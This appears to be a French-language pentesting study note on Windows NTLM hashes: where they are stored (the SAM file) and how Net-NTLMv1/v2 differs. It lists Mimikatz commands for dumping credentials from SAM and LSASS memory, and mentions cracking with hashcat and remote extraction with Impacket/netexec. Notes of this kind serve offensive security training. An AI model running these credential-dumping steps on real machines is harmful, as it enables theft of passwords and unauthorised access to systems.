New Technologie Lan Manager aussi NTHash
Utilisé **localement** sur windows

Gardé dans le Security Account Manager (SAM) **C:\Windows\system32\config\sam**
Utiliser Mimikatz pour extraire les hashes de la mémoire du Local Security Authority Subsystem (LSASS)

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
#Liste des usagers
Get-LocalUser
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


# Mimikatz
Pour sortir les hashes
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ shell
privilege::debug
token::elevate
#sam
lsadump::sam
#lsa
lsadump::secrets
#ou
sekurlsa::logonpasswords
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Craquer avec hashcat

# Impacket/netexec
Regarder dans les librairies, il y a une couple de fonctions pour extraire ça a distance.

# NTLMv1/v2
Aussi appellé Net-NTLMv1/v2, n'est pas la même chose que NTLM
Gère l'authentification pour les clients et serveurs windows sur un réseau
Pas très sécuritaire et outre passé par Kerberos. Encore utilisé par compatibilité.